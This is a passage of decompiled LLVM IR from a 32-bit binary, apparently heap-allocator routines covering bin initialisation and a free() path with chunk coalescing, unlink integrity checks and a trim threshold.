  %v2_804dffc = inttoptr i32 %v1_804dffc to i32*
  %v3_804dffc = load i32, i32* %v2_804dffc, align 4
  store i32 %v3_804dffc, i32* @esi, align 4
  %v12_804dfff = icmp eq i32 %v3_804dffc, %v0_804dff6
  %v1_804e001 = icmp eq i1 %v12_804dfff, false
  br i1 %v1_804e001, label %dec_label_pc_804e008, label %dec_label_pc_804e003

dec_label_pc_804e003:                             ; preds = %dec_label_pc_804dff6
  %v1_804e003 = add i32 %v3_804dff9, 8
  %v2_804e003 = inttoptr i32 %v1_804e003 to i32*
  %v3_804e003 = load i32, i32* %v2_804e003, align 4
  %v15_804e003 = icmp eq i32 %v3_804e003, %v3_804dffc
  br i1 %v15_804e003, label %dec_label_pc_804e00d, label %dec_label_pc_804e008

dec_label_pc_804e008:                             ; preds = %dec_label_pc_804e003, %dec_label_pc_804dff6, %dec_label_pc_804dfcb, %dec_label_pc_804dfb8
  %v0_804e008 = call i32 @function_804e2a4()
  store i32 %v0_804e008, i32* %eax.global-to-local, align 4
  %v1_804e00f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e00d

dec_label_pc_804e00d:                             ; preds = %dec_label_pc_804e003, %dec_label_pc_804e008
  %v1_804e00f = phi i32 [ %v3_804dff6, %dec_label_pc_804e003 ], [ %v1_804e00f.pre, %dec_label_pc_804e008 ]
  %v0_804e00f = phi i32 [ %v3_804dff9, %dec_label_pc_804e003 ], [ %v0_804e008, %dec_label_pc_804e008 ]
  %v0_804e00d = load i32, i32* @edi, align 4
  %v1_804e00d = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e00d = add i32 %v1_804e00d, %v0_804e00d
  store i32 %v2_804e00d, i32* @edi, align 4
  %v2_804e00f = add i32 %v1_804e00f, 12
  %v3_804e00f = inttoptr i32 %v2_804e00f to i32*
  store i32 %v0_804e00f, i32* %v3_804e00f, align 4
  %v0_804e012 = load i32, i32* @edx, align 4
  %v1_804e012 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e012 = add i32 %v1_804e012, 8
  %v3_804e012 = inttoptr i32 %v2_804e012 to i32*
  store i32 %v0_804e012, i32* %v3_804e012, align 4
  br label %dec_label_pc_804e015

dec_label_pc_804e015:                             ; preds = %dec_label_pc_804dfe8, %dec_label_pc_804e00d
  store i32 %v1_804df60, i32* %eax.global-to-local, align 4
  %v3_804e019 = load i32, i32* %v2_804e019, align 4
  store i32 %v3_804e019, i32* @edx, align 4
  %v0_804e01c = load i32, i32* @ecx, align 4
  store i32 %v0_804e01c, i32* %v2_804e019, align 4
  %v0_804e01f = load i32, i32* @edi, align 4
  %v1_804e021 = or i32 %v0_804e01f, 1
  store i32 %v1_804e021, i32* %eax.global-to-local, align 4
  %v0_804e024 = load i32, i32* @ecx, align 4
  %v1_804e024 = load i32, i32* @edx, align 4
  %v2_804e024 = add i32 %v1_804e024, 12
  %v3_804e024 = inttoptr i32 %v2_804e024 to i32*
  store i32 %v0_804e024, i32* %v3_804e024, align 4
  %v0_804e027 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e027 = load i32, i32* @ecx, align 4
  %v2_804e027 = add i32 %v1_804e027, 4
  %v3_804e027 = inttoptr i32 %v2_804e027 to i32*
  store i32 %v0_804e027, i32* %v3_804e027, align 4
  store i32 %v1_804df60, i32* %eax.global-to-local, align 4
  %v0_804e02e = load i32, i32* @edx, align 4
  %v1_804e02e = load i32, i32* @ecx, align 4
  %v2_804e02e = add i32 %v1_804e02e, 8
  %v3_804e02e = inttoptr i32 %v2_804e02e to i32*
  store i32 %v0_804e02e, i32* %v3_804e02e, align 4
  %v0_804e031 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e031 = load i32, i32* @ecx, align 4
  %v2_804e031 = add i32 %v1_804e031, 12
  %v3_804e031 = inttoptr i32 %v2_804e031 to i32*
  store i32 %v0_804e031, i32* %v3_804e031, align 4
  %v0_804e034 = load i32, i32* @edi, align 4
  %v1_804e034 = load i32, i32* @ecx, align 4
  %v3_804e034 = add i32 %v1_804e034, %v0_804e034
  %v4_804e034 = inttoptr i32 %v3_804e034 to i32*
  store i32 %v0_804e034, i32* %v4_804e034, align 4
  br label %dec_label_pc_804e049

dec_label_pc_804e039:                             ; preds = %dec_label_pc_804dfd8
  %v0_804e039 = load i32, i32* @edi, align 4
  %v2_804e039 = add i32 %v0_804e039, %v1_804dfe0
  %v1_804e03c = or i32 %v2_804e039, 1
  store i32 %v1_804e03c, i32* %eax.global-to-local, align 4
  %v1_804e03f = load i32, i32* @ecx, align 4
  %v2_804e03f = add i32 %v1_804e03f, 4
  %v3_804e03f = inttoptr i32 %v2_804e03f to i32*
  store i32 %v1_804e03c, i32* %v3_804e03f, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_804e046 = load i32, i32* @ecx, align 4
  store i32 %v0_804e046, i32* %v3_804e046, align 4
  br label %dec_label_pc_804e049

dec_label_pc_804e049:                             ; preds = %dec_label_pc_804e015, %dec_label_pc_804e039
  store i32 %v3_804df9b, i32* @ecx, align 4
  %v1_804e04d = icmp eq i32 %v3_804df9b, 0
  %v1_804e04f = icmp eq i1 %v1_804e04d, false
  br i1 %v1_804e04f, label %dec_label_pc_804df9b, label %dec_label_pc_804e055

dec_label_pc_804e055:                             ; preds = %dec_label_pc_804e049, %dec_label_pc_804df87
  store i32 %v4_804df7f, i32* @ecx, align 4
  %v15_804e059 = icmp eq i32 %v0_804df95, %v4_804df7f
  br i1 %v15_804e059, label %dec_label_pc_804e0dd, label %dec_label_pc_804e05f

dec_label_pc_804e05f:                             ; preds = %dec_label_pc_804e055
  %v4_804e05f = add i32 %v0_804df95, 4
  br label %dec_label_pc_804df87

dec_label_pc_804e069:                             ; preds = %dec_label_pc_804e078.preheader, %dec_label_pc_804e069
  %v1_804e06d20 = phi i32 [ 1, %dec_label_pc_804e078.preheader ], [ %v0_804e078.pre, %dec_label_pc_804e069 ]
  %v2_804e06d = mul i32 %v1_804e06d20, 8
  %v4_804e06d = add i32 %v3_804e06d, %v2_804e06d
  store i32 %v4_804e06d, i32* %eax.global-to-local, align 4
  %v1_804e071 = add i32 %v1_804e06d20, 1
  store i32 %v1_804e071, i32* %edx.global-to-local, align 4
  %v2_804e072 = add i32 %v4_804e06d, 12
  %v3_804e072 = inttoptr i32 %v2_804e072 to i32*
  store i32 %v4_804e06d, i32* %v3_804e072, align 4
  %v0_804e075 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e075 = add i32 %v0_804e075, 8
  %v3_804e075 = inttoptr i32 %v2_804e075 to i32*
  store i32 %v0_804e075, i32* %v3_804e075, align 4
  %v0_804e078.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_804e07b = icmp sgt i32 %v0_804e078.pre, 95
  br i1 %v7_804e07b, label %dec_label_pc_804e07d, label %dec_label_pc_804e069

dec_label_pc_804e07d:                             ; preds = %dec_label_pc_804e069
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804e081 = add i32 %tmp11, 864
  %v2_804e081 = inttoptr i32 %v1_804e081 to i32*
  %v3_804e081 = load i32, i32* %v2_804e081, align 4
  %v4_804e081 = or i32 %v3_804e081, 1
  store i32 %v4_804e081, i32* %v2_804e081, align 4
  %v0_804e088 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e088 = add i32 %v0_804e088, 840
  %v2_804e088 = inttoptr i32 %v1_804e088 to i32*
  store i32 0, i32* %v2_804e088, align 4
  %v0_804e092 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e092 = add i32 %v0_804e092, 852
  %v2_804e092 = inttoptr i32 %v1_804e092 to i32*
  store i32 65536, i32* %v2_804e092, align 4
  %v0_804e09c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e09c = add i32 %v0_804e09c, 844
  %v2_804e09c = inttoptr i32 %v1_804e09c to i32*
  store i32 262144, i32* %v2_804e09c, align 4
  %v0_804e0a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e0a6 = add i32 %v0_804e0a6, 836
  %v2_804e0a6 = inttoptr i32 %v1_804e0a6 to i32*
  store i32 262144, i32* %v2_804e0a6, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_804e0b7 = load i32, i32* %arg1, align 4
  %v1_804e0b9 = urem i32 %v2_804e0b7, 4
  %v1_804e0bc = or i32 %v1_804e0b9, 72
  store i32 %v1_804e0bc, i32* %arg1, align 4
  %v0_804e0c1 = load i32, i32* @edx, align 4
  %v1_804e0c3 = add i32 %v0_804e0c1, 52
  store i32 %v1_804e0c3, i32* %eax.global-to-local, align 4
  %v2_804e0c6 = add i32 %v0_804e0c1, 44
  %v3_804e0c6 = inttoptr i32 %v2_804e0c6 to i32*
  store i32 %v1_804e0c3, i32* %v3_804e0c6, align 4
  %v1_804e0cb = call i32 @function_804eae4(i32 30)
  store i32 %v1_804e0cb, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_804e0d7 = add i32 %tmp11, 860
  %v3_804e0d7 = inttoptr i32 %v2_804e0d7 to i32*
  store i32 %v1_804e0cb, i32* %v3_804e0d7, align 4
  br label %dec_label_pc_804e0dd

dec_label_pc_804e0dd:                             ; preds = %dec_label_pc_804e055, %dec_label_pc_804e07d
  store i32 %v0_804df40, i32* @ebx, align 4
  store i32 %v0_804df3f, i32* @esi, align 4
  store i32 %v0_804df3e, i32* @edi, align 4
  %v0_804e0e4 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804e0e4

; uselistorder directives
  uselistorder i32 %v0_804e075, { 1, 0 }
  uselistorder i32 %v0_804e034, { 1, 0 }
  uselistorder i32 %v1_804dfef, { 1, 0 }
  uselistorder i32 %v2_804dfe8, { 1, 0 }
  uselistorder i32 %v1_804dfe0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804dfec, { 1, 0 }
  uselistorder i32 %v3_804df9b, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804dfb8, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804df95, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804e046, { 1, 0 }
  uselistorder i32 %v1_804df60, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804e0dd, { 1, 0 }
  uselistorder label %dec_label_pc_804e069, { 1, 0 }
  uselistorder label %dec_label_pc_804e049, { 1, 0 }
  uselistorder label %dec_label_pc_804e015, { 1, 0 }
  uselistorder label %dec_label_pc_804e00d, { 1, 0 }
  uselistorder label %dec_label_pc_804dfd8, { 1, 0 }
}

define i32 @function_804e0e5(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e0e5:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804e0e5 = load i32, i32* @ebp, align 4
  %v0_804e0e6 = load i32, i32* @edi, align 4
  %v0_804e0e7 = load i32, i32* @esi, align 4
  %v0_804e0e8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804e0f0 = icmp eq i32 %arg1, 0
  br i1 %v1_804e0f0, label %dec_label_pc_804e279, label %dec_label_pc_804e0f8

dec_label_pc_804e0f8:                             ; preds = %dec_label_pc_804e0e5
  %v2_804e103 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e103, i32* @eax, align 4
  %v2_804e108 = call i32 @function_804ec6e(i32 %v2_804e103, i32 134540395)
  store i32 %v2_804e108, i32* %eax.global-to-local, align 4
  %v1_804e114 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80558d0.139 to i32))
  %v1_804e119 = add i32 %arg1, -8
  store i32 %v1_804e119, i32* @ecx, align 4
  %v0_804e11c = load i8, i8* @global_var_8058340.140, align 1
  %v1_804e11c = sext i8 %v0_804e11c to i32
  store i32 %v1_804e11c, i32* %eax.global-to-local, align 4
  %v1_804e124 = add i32 %arg1, -4
  %v2_804e124 = inttoptr i32 %v1_804e124 to i32*
  %v3_804e124 = load i32, i32* %v2_804e124, align 4
  %v1_804e129 = and i32 %v3_804e124, -4
  %v4_804e129 = trunc i32 %v1_804e129 to i8
  store i32 %v1_804e129, i32* @ebx, align 4
  %v8_804e12e = icmp ugt i8 %v4_804e129, %v0_804e11c
  br i1 %v8_804e12e, label %dec_label_pc_804e150, label %dec_label_pc_804e130

dec_label_pc_804e130:                             ; preds = %dec_label_pc_804e0f8
  %v2_804e130 = udiv i32 %v3_804e124, 8
  %v1_804e133 = or i32 %v1_804e11c, 3
  %v3_804e133 = trunc i32 %v1_804e133 to i8
  store i32 %v1_804e133, i32* %eax.global-to-local, align 4
  store i8 %v3_804e133, i8* @global_var_8058340.140, align 64
  %v1_804e13b = mul nuw i32 %v2_804e130, 4
  %v2_804e13b = add i32 %v1_804e13b, ptrtoint (i8* @global_var_8058340.140 to i32)
  store i32 %v2_804e13b, i32* @edx, align 4
  %v1_804e142 = add i32 %v1_804e13b, add (i32 ptrtoint (i8* @global_var_8058340.140 to i32), i32 -4)
  %v2_804e142 = inttoptr i32 %v1_804e142 to i32*
  %v3_804e142 = load i32, i32* %v2_804e142, align 4
  store i32 %v3_804e142, i32* %eax.global-to-local, align 4
  %v3_804e145 = inttoptr i32 %arg1 to i32*
  store i32 %v3_804e142, i32* %v3_804e145, align 4
  %v0_804e148 = load i32, i32* @ecx, align 4
  %v1_804e148 = load i32, i32* @edx, align 4
  %v2_804e148 = add i32 %v1_804e148, -4
  %v3_804e148 = inttoptr i32 %v2_804e148 to i32*
  store i32 %v0_804e148, i32* %v3_804e148, align 4
  br label %dec_label_pc_804e268

dec_label_pc_804e150:                             ; preds = %dec_label_pc_804e0f8
  %v1_804e150 = trunc i32 %v3_804e124 to i8
  %v2_804e150 = and i8 %v1_804e150, 2
  %v3_804e150 = icmp eq i8 %v2_804e150, 0
  %v5_804e150 = zext i8 %v2_804e150 to i32
  %v7_804e150 = and i32 %v3_804e124, -256
  %v8_804e150 = or i32 %v5_804e150, %v7_804e150
  store i32 %v8_804e150, i32* @edx, align 4
  %v1_804e153 = icmp eq i1 %v3_804e150, false
  br i1 %v1_804e153, label %dec_label_pc_804e248, label %dec_label_pc_804e159

dec_label_pc_804e159:                             ; preds = %dec_label_pc_804e150
  %v1_804e159 = or i32 %v1_804e11c, 1
  %v3_804e159 = trunc i32 %v1_804e159 to i8
  store i32 %v1_804e159, i32* %eax.global-to-local, align 4
  %v2_804e15c = add i32 %v1_804e129, %v1_804e119
  store i32 %v2_804e15c, i32* @esi, align 4
  store i8 %v3_804e159, i8* @global_var_8058340.140, align 64
  %v1_804e164 = add i32 %v2_804e15c, 4
  %v2_804e164 = inttoptr i32 %v1_804e164 to i32*
  %v3_804e164 = load i32, i32* %v2_804e164, align 4
  store i32 %v3_804e164, i32* %eax.global-to-local, align 4
  %v2_804e16b = inttoptr i32 %v1_804e124 to i8*
  %v3_804e16b = load i8, i8* %v2_804e16b, align 1
  %v4_804e16b = urem i8 %v3_804e16b, 2
  %v5_804e16b = icmp eq i8 %v4_804e16b, 0
  %v1_804e16f = icmp eq i1 %v5_804e16b, false
  br i1 %v1_804e16f, label %dec_label_pc_804e192, label %dec_label_pc_804e171

dec_label_pc_804e171:                             ; preds = %dec_label_pc_804e159
  %v2_804e171 = inttoptr i32 %v1_804e119 to i32*
  %v3_804e171 = load i32, i32* %v2_804e171, align 4
  store i32 %v3_804e171, i32* @ebp, align 4
  %v2_804e176 = sub i32 %v1_804e119, %v3_804e171
  store i32 %v2_804e176, i32* %eax.global-to-local, align 4
  %v1_804e178 = add i32 %v2_804e176, 8
  %v2_804e178 = inttoptr i32 %v1_804e178 to i32*
  %v3_804e178 = load i32, i32* %v2_804e178, align 4
  store i32 %v3_804e178, i32* @edi, align 4
  %v1_804e17b = add i32 %v2_804e176, 12
  %v2_804e17b = inttoptr i32 %v1_804e17b to i32*
  %v3_804e17b = load i32, i32* %v2_804e17b, align 4
  store i32 %v3_804e17b, i32* @edx, align 4
  %v1_804e17e = add i32 %v3_804e178, 12
  %v2_804e17e = inttoptr i32 %v1_804e17e to i32*
  %v3_804e17e = load i32, i32* %v2_804e17e, align 4
  store i32 %v3_804e17e, i32* @ecx, align 4
  %v12_804e181 = icmp eq i32 %v3_804e17e, %v2_804e176
  %v1_804e183 = icmp eq i1 %v12_804e181, false
  br i1 %v1_804e183, label %dec_label_pc_804e1c1, label %dec_label_pc_804e185

dec_label_pc_804e185:                             ; preds = %dec_label_pc_804e171
  %v1_804e185 = add i32 %v3_804e17b, 8
  %v2_804e185 = inttoptr i32 %v1_804e185 to i32*
  %v3_804e185 = load i32, i32* %v2_804e185, align 4
  %v15_804e185 = icmp eq i32 %v3_804e185, %v3_804e17e
  %v1_804e188 = icmp eq i1 %v15_804e185, false
  br i1 %v1_804e188, label %dec_label_pc_804e1c1, label %dec_label_pc_804e18a

dec_label_pc_804e18a:                             ; preds = %dec_label_pc_804e185
  %v2_804e18a = add i32 %v3_804e171, %v1_804e129
  store i32 %v2_804e18a, i32* @ebx, align 4
  store i32 %v3_804e17b, i32* %v2_804e17e, align 4
  %v0_804e18f = load i32, i32* @edi, align 4
  %v1_804e18f = load i32, i32* @edx, align 4
  %v2_804e18f = add i32 %v1_804e18f, 8
  %v3_804e18f = inttoptr i32 %v2_804e18f to i32*
  store i32 %v0_804e18f, i32* %v3_804e18f, align 4
  %v0_804e199.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e192

dec_label_pc_804e192:                             ; preds = %dec_label_pc_804e159, %dec_label_pc_804e18a
  %v1_804e1a5 = phi i32 [ %v2_804e15c, %dec_label_pc_804e159 ], [ %v0_804e199.pre, %dec_label_pc_804e18a ]
  %v1_804e196 = and i32 %v3_804e164, -4
  store i32 %v1_804e196, i32* @ebp, align 4
  %v1_804e199 = load i32, i32* @global_var_805836c.141, align 4
  %v12_804e199 = icmp eq i32 %v1_804e1a5, %v1_804e199
  br i1 %v12_804e199, label %dec_label_pc_804e1f3, label %dec_label_pc_804e1a1

dec_label_pc_804e1a1:                             ; preds = %dec_label_pc_804e192
  %v2_804e1a1 = add i32 %v1_804e1a5, 4
  %v3_804e1a1 = add i32 %v2_804e1a1, %v1_804e196
  %v4_804e1a1 = inttoptr i32 %v3_804e1a1 to i32*
  %v5_804e1a1 = load i32, i32* %v4_804e1a1, align 4
  store i32 %v5_804e1a1, i32* %eax.global-to-local, align 4
  %v3_804e1a5 = inttoptr i32 %v2_804e1a1 to i32*
  store i32 %v1_804e196, i32* %v3_804e1a5, align 4
  %v0_804e1a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e1a8 = urem i32 %v0_804e1a8, 2
  %v2_804e1a8 = icmp eq i32 %v1_804e1a8, 0
  store i32 %v1_804e1a8, i32* %eax.global-to-local, align 4
  %v1_804e1ad = icmp eq i1 %v2_804e1a8, false
  br i1 %v1_804e1ad, label %dec_label_pc_804e1ce, label %dec_label_pc_804e1af

dec_label_pc_804e1af:                             ; preds = %dec_label_pc_804e1a1
  %v0_804e1af = load i32, i32* @esi, align 4
  %v1_804e1af = add i32 %v0_804e1af, 8
  %v2_804e1af = inttoptr i32 %v1_804e1af to i32*
  %v3_804e1af = load i32, i32* %v2_804e1af, align 4
  store i32 %v3_804e1af, i32* @edx, align 4
  %v1_804e1b2 = add i32 %v0_804e1af, 12
  %v2_804e1b2 = inttoptr i32 %v1_804e1b2 to i32*
  %v3_804e1b2 = load i32, i32* %v2_804e1b2, align 4
  store i32 %v3_804e1b2, i32* %eax.global-to-local, align 4
  %v1_804e1b5 = add i32 %v3_804e1af, 12
  %v2_804e1b5 = inttoptr i32 %v1_804e1b5 to i32*
  %v3_804e1b5 = load i32, i32* %v2_804e1b5, align 4
  store i32 %v3_804e1b5, i32* @edi, align 4
  %v12_804e1b8 = icmp eq i32 %v3_804e1b5, %v0_804e1af
  %v1_804e1ba = icmp eq i1 %v12_804e1b8, false
  br i1 %v1_804e1ba, label %dec_label_pc_804e1c1, label %dec_label_pc_804e1bc

dec_label_pc_804e1bc:                             ; preds = %dec_label_pc_804e1af
  %v1_804e1bc = add i32 %v3_804e1b2, 8
  %v2_804e1bc = inttoptr i32 %v1_804e1bc to i32*
  %v3_804e1bc = load i32, i32* %v2_804e1bc, align 4
  %v15_804e1bc = icmp eq i32 %v3_804e1bc, %v3_804e1b5
  br i1 %v15_804e1bc, label %dec_label_pc_804e1c6, label %dec_label_pc_804e1c1

dec_label_pc_804e1c1:                             ; preds = %dec_label_pc_804e1bc, %dec_label_pc_804e1af, %dec_label_pc_804e185, %dec_label_pc_804e171
  %v0_804e1c1 = call i32 @function_804e2a4()
  store i32 %v0_804e1c1, i32* %eax.global-to-local, align 4
  %v1_804e1c6.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e1c6

dec_label_pc_804e1c6:                             ; preds = %dec_label_pc_804e1bc, %dec_label_pc_804e1c1
  %v1_804e1c6 = phi i32 [ %v3_804e1af, %dec_label_pc_804e1bc ], [ %v1_804e1c6.pre, %dec_label_pc_804e1c1 ]
  %v0_804e1c6 = phi i32 [ %v3_804e1b2, %dec_label_pc_804e1bc ], [ %v0_804e1c1, %dec_label_pc_804e1c1 ]
  %v2_804e1c6 = add i32 %v1_804e1c6, 12
  %v3_804e1c6 = inttoptr i32 %v2_804e1c6 to i32*
  store i32 %v0_804e1c6, i32* %v3_804e1c6, align 4
  %v0_804e1c9 = load i32, i32* @edx, align 4
  %v1_804e1c9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1c9 = add i32 %v1_804e1c9, 8
  %v3_804e1c9 = inttoptr i32 %v2_804e1c9 to i32*
  store i32 %v0_804e1c9, i32* %v3_804e1c9, align 4
  %v0_804e1cc = load i32, i32* @ebx, align 4
  %v1_804e1cc = load i32, i32* @ebp, align 4
  %v2_804e1cc = add i32 %v1_804e1cc, %v0_804e1cc
  store i32 %v2_804e1cc, i32* @ebx, align 4
  br label %dec_label_pc_804e1ce

dec_label_pc_804e1ce:                             ; preds = %dec_label_pc_804e1a1, %dec_label_pc_804e1c6
  %v0_804e1ce = load i32, i32* @global_var_805837c.159, align 4
  store i32 %v0_804e1ce, i32* %eax.global-to-local, align 4
  %v0_804e1d3 = load i32, i32* @ecx, align 4
  %v1_804e1d3 = add i32 %v0_804e1d3, 12
  %v2_804e1d3 = inttoptr i32 %v1_804e1d3 to i32*
  store i32 ptrtoint (i32* @global_var_8058374.143 to i32), i32* %v2_804e1d3, align 4
  %v0_804e1da = load i32, i32* %eax.global-to-local, align 4
  %v1_804e1da = load i32, i32* @ecx, align 4
  %v2_804e1da = add i32 %v1_804e1da, 8
  %v3_804e1da = inttoptr i32 %v2_804e1da to i32*
  store i32 %v0_804e1da, i32* %v3_804e1da, align 4
  %v0_804e1dd = load i32, i32* @ebx, align 4
  %v1_804e1dd = load i32, i32* @ecx, align 4
  %v3_804e1dd = add i32 %v1_804e1dd, %v0_804e1dd
  %v4_804e1dd = inttoptr i32 %v3_804e1dd to i32*
  store i32 %v0_804e1dd, i32* %v4_804e1dd, align 4
  %v0_804e1e0 = load i32, i32* @ecx, align 4
  %v1_804e1e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1e0 = add i32 %v1_804e1e0, 12
  %v3_804e1e0 = inttoptr i32 %v2_804e1e0 to i32*
  store i32 %v0_804e1e0, i32* %v3_804e1e0, align 4
  %v0_804e1e3 = load i32, i32* @ebx, align 4
  %v1_804e1e5 = or i32 %v0_804e1e3, 1
  store i32 %v1_804e1e5, i32* %eax.global-to-local, align 4
  %v0_804e1e8 = load i32, i32* @ecx, align 4
  store i32 %v0_804e1e8, i32* @global_var_805837c.159, align 4
  %v2_804e1ee = add i32 %v0_804e1e8, 4
  %v3_804e1ee = inttoptr i32 %v2_804e1ee to i32*
  store i32 %v1_804e1e5, i32* %v3_804e1ee, align 4
  br label %dec_label_pc_804e203

dec_label_pc_804e1f3:                             ; preds = %dec_label_pc_804e192
  %v0_804e1f3 = load i32, i32* @ebx, align 4
  %v2_804e1f3 = add i32 %v0_804e1f3, %v1_804e196
  store i32 %v2_804e1f3, i32* @ebx, align 4
  %v1_804e1f7 = or i32 %v2_804e1f3, 1
  store i32 %v1_804e1f7, i32* %eax.global-to-local, align 4
  %v1_804e1fa = load i32, i32* @ecx, align 4
  %v2_804e1fa = add i32 %v1_804e1fa, 4
  %v3_804e1fa = inttoptr i32 %v2_804e1fa to i32*
  store i32 %v1_804e1f7, i32* %v3_804e1fa, align 4
  %v0_804e1fd = load i32, i32* @ecx, align 4
  store i32 %v0_804e1fd, i32* @global_var_805836c.141, align 4
  br label %dec_label_pc_804e203

dec_label_pc_804e203:                             ; preds = %dec_label_pc_804e1ce, %dec_label_pc_804e1f3
  %v0_804e203 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_804e203, 131072
  br i1 %tmp21, label %dec_label_pc_804e268, label %dec_label_pc_804e20b

dec_label_pc_804e20b:                             ; preds = %dec_label_pc_804e203
  %v0_804e20b = load i8, i8* @global_var_8058340.140, align 64
  %v1_804e20b = and i8 %v0_804e20b, 2
  %v2_804e20b = icmp eq i8 %v1_804e20b, 0
  br i1 %v2_804e20b, label %dec_label_pc_804e224, label %dec_label_pc_804e214

dec_label_pc_804e214:                             ; preds = %dec_label_pc_804e20b
  %v2_804e21c = call i32 @function_804df3d(i32* bitcast (i8* @global_var_8058340.140 to i32*))
  store i32 %v2_804e21c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e224

dec_label_pc_804e224:                             ; preds = %dec_label_pc_804e20b, %dec_label_pc_804e214
  %v0_804e224 = load i32, i32* @global_var_805836c.141, align 4
  store i32 %v0_804e224, i32* %eax.global-to-local, align 4
  %v1_804e229 = add i32 %v0_804e224, 4
  %v2_804e229 = inttoptr i32 %v1_804e229 to i32*
  %v3_804e229 = load i32, i32* %v2_804e229, align 4
  %v1_804e22c = and i32 %v3_804e229, -4
  store i32 %v1_804e22c, i32* %eax.global-to-local, align 4
  %v1_804e22f = load i32, i32* @global_var_8058684.157, align 4
  %v7_804e22f = icmp ult i32 %v1_804e22c, %v1_804e22f
  br i1 %v7_804e22f, label %dec_label_pc_804e268, label %dec_label_pc_804e237

dec_label_pc_804e237:                             ; preds = %dec_label_pc_804e224
  store i32 ptrtoint (i8* @global_var_8058340.140 to i32), i32* @edx, align 4
  %v0_804e23c = load i32, i32* @global_var_8058688.155, align 8
  store i32 %v0_804e23c, i32* @eax, align 4
  %v0_804e241 = call i32 @function_804deb0()
  store i32 %v0_804e241, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e268

dec_label_pc_804e248:                             ; preds = %dec_label_pc_804e150
  %v2_804e248 = inttoptr i32 %v1_804e119 to i32*
  %v3_804e248 = load i32, i32* %v2_804e248, align 4
  %v0_804e24b = load i32, i32* @global_var_8058690.148, align 16
  %v1_804e24b = add i32 %v0_804e24b, -1
  store i32 %v1_804e24b, i32* @global_var_8058690.148, align 16
  %v2_804e251 = add i32 %v3_804e248, %v1_804e129
  store i32 %v2_804e251, i32* %eax.global-to-local, align 4
  %v2_804e254 = sub i32 %v1_804e119, %v3_804e248
  %v0_804e25a = load i32, i32* @global_var_80586a4.151, align 4
  %v2_804e25a = sub i32 %v0_804e25a, %v2_804e251
  store i32 %v2_804e25a, i32* @global_var_80586a4.151, align 4
  %v4_804e260 = inttoptr i32 %v2_804e254 to i32*
  %v5_804e260 = call i32 @function_804f298(i32* %v4_804e260, i32 %v2_804e251, i32 %v1_804e129, i32 %v1_804e129)
  store i32 %v5_804e260, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e268

dec_label_pc_804e268:                             ; preds = %dec_label_pc_804e224, %dec_label_pc_804e203, %dec_label_pc_804e237, %dec_label_pc_804e130, %dec_label_pc_804e248
  store i32 %v2_804e103, i32* @eax, align 4
  %v2_804e271 = call i32 @function_804ec6e(i32 %v2_804e103, i32 1)
  store i32 %v2_804e271, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e279

dec_label_pc_804e279:                             ; preds = %dec_label_pc_804e0e5, %dec_label_pc_804e268
  %.0 = phi i32 [ undef, %dec_label_pc_804e0e5 ], [ %v2_804e271, %dec_label_pc_804e268 ]
  store i32 %v0_804e0e8, i32* @ebx, align 4
  store i32 %v0_804e0e7, i32* @esi, align 4
  store i32 %v0_804e0e6, i32* @edi, align 4
  store i32 %v0_804e0e5, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804e248, { 1, 0 }
  uselistorder i32 %v0_804e1dd, { 1, 0 }
  uselistorder i32 %v1_804e1a8, { 1, 0 }
  uselistorder i32 %v2_804e1a1, { 1, 0 }
  uselistorder i32 %v1_804e196, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e1a5, { 1, 0 }
  uselistorder i32 %v1_804e129, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804e124, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804e119, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8058340.140 to i32*), { 0, 2, 1, 3 }
